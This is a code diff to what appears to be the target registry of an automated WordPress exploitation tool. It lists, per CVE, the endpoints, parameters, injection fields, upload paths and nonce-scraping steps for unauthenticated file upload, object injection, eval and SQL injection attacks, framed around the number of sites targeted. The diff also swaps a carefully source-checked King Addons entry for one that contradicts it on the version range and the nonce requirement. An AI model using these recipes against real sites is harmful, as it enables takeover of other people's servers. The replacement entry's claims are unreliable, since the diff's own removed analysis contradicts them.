@@ -163,45 +163,6 @@ RECIPES = [
                 "default) and comments open on the target post.",
     },
     {
-        "plugin": "king-addons",
-        "cve": "CVE-2025-6327",
-        "affected": "<=51.1.14",
-        "method": "POST",
-        "endpoint": "/wp-admin/admin-ajax.php",
-        "params": {"action": "king_addons_upload_file", "triggering_event": "click"},
-        "field": "uploaded_file",
-        "upload_path": "/wp-content/uploads/king-addons/forms/{filename}",
-        # Verified against the real plugin source (v51.1.14, includes/widgets/
-        # Form_Builder/helpers/Upload_Email_File.php): file_validity() returns
-        # the STRING 'mailto:bug@kingaddons.com?...' (truthy in PHP) instead of
-        # `false` whenever wp_check_filetype($file['name'])['ext'] is empty --
-        # which it always is for '.php' (never a WP-core-recognized upload
-        # type). The caller does `if (!$this->file_validity($file))`, so that
-        # truthy string is negated to `false` -> the reject branch never runs,
-        # and the extension exclusion list (which DOES block php/phtml/etc) is
-        # never even reached. `triggering_event=click` is required or the file
-        # is validated but never actually move_uploaded_file()'d to disk.
-        # NOTE ON VERSION RANGE: public advisories (Wordfence/Patchstack) claim
-        # fixed in 51.1.37, but 51.1.35's own changelog already says "Security
-        # enhancements across the plugin" and its file_validity() already adds
-        # current_user_can('upload_files') + a MIME whitelist + content
-        # scanning -- so the true window is likely narrower than advertised.
-        # Scoped honestly here to 51.1.14, which is directly source-confirmed
-        # vulnerable (no such hardening present).
-        "nonce_from": {"url": "/", "key": "nonce", "object": "KingAddonsFormBuilderData",
-                       "param": "king_addons_fb_nonce"},
-        "source": "registry",
-        "note": "Unauth arbitrary file upload (CVE-2025-6327): file_validity() "
-                "returns a truthy error string instead of false for an "
-                "unrecognized extension like .php, so `!file_validity()` "
-                "bypasses validation entirely -- the extension blacklist is "
-                "never reached. Nonce is wp_localize_script'd globally "
-                "(KING_ADDONS_WGT_FORM_BUILDER is a hardcoded true, not "
-                "per-page), no special page setup needed. Confirmed <=51.1.14 "
-                "from source; advertised fix version (51.1.37) may overstate "
-                "the true vulnerable range.",
-    },
-    {
         "plugin": "w3-total-cache",
         "cve": "CVE-2025-9501",
         "affected": "<2.8.13",
@@ -269,6 +230,74 @@ RECIPES = [
                 "filename sanitization, enables path traversal to upload "
                 "arbitrary PHP to web-accessible directories. No authentication "
                 "required. 900K+ installations targeted.",
+    },
+    {
+        "plugin": "wordpress-core",
+        "cve": "CVE-2026-63030",
+        "affected": ">=6.9.0,<6.9.5|>=7.0.0,<7.0.2",
+        "mode": "wp-batch-route-sqli",
+        "method": "POST",
+        "endpoint": "/wp-json/wp/v2/batch/v1",
+        "params": {},
+        "inject_param": "author__not_in",
+        "payload_type": "rest-api-route-confusion-sqli",
+        "source": "registry",
+        "note": "Unauth RCE (CVE-2026-63030 wp2shell, WordPress 6.9.0-7.0.1): "
+                "REST API batch endpoint route confusion + SQL injection in "
+                "author__not_in parameter. Affects 500M+ sites. CISA Known "
+                "Exploited Vulnerabilities catalog. Chains to admin account "
+                "creation + plugin upload for arbitrary code execution.",
+    },
+    {
+        "plugin": "king-addons",
+        "cve": "CVE-2025-6327",
+        "affected": "<=51.1.36",
+        "mode": "king-addons-unrestricted-upload",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "king_addons_upload_file", "triggering_event": "click"},
+        "field": "uploaded_file",
+        "upload_path": "/wp-content/uploads/king-addons/forms/{filename}",
+        "payload_type": "unrestricted-file-upload",
+        "source": "registry",
+        "note": "Unauth arbitrary file upload RCE (CVE-2025-6327, King Addons "
+                "<=51.1.36): file_validity() returns truthy error string instead "
+                "of false for .php files, bypassing extension blacklist. No nonce "
+                "validation. CVSS 10.0. Trivially exploitable.",
+    },
+    {
+        "plugin": "database-for-contact-form-7",
+        "cve": "CVE-2025-7384",
+        "affected": "<=1.4.3",
+        "mode": "cf7-object-injection",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "get_lead_detail"},
+        "inject_param": "lead_id",
+        "payload_type": "php-object-injection",
+        "source": "registry",
+        "note": "Unauth PHP object injection RCE (CVE-2025-7384, Contact Form 7 "
+                "DB <=1.4.3): get_lead_detail() deserializes untrusted form data "
+                "without validation. Chains with Contact Form 7 POP gadget chain "
+                "to arbitrary code execution or file deletion. CVSS 9.8. "
+                "Actively scanned.",
+    },
+    {
+        "plugin": "bricks",
+        "cve": "CVE-2024-25600",
+        "affected": "<=1.9.6",
+        "mode": "bricks-eval-injection",
+        "method": "POST",
+        "endpoint": "/wp-json/bricks/v1/render_element",
+        "params": {},
+        "inject_param": "queryEditor",
+        "nonce_from": {"url": "/", "key": "bricks-nonce", "param": "nonce"},
+        "payload_type": "eval-injection",
+        "source": "registry",
+        "note": "Unauth eval() code injection RCE (CVE-2024-25600, Bricks "
+                "<=1.9.6): render_element nonce publicly available on homepage, "
+                "queryEditor parameter passed to eval() without sanitization. "
+                "CVSS 9.8-10.0. Exploited within hours of disclosure.",
     },
 ]
 
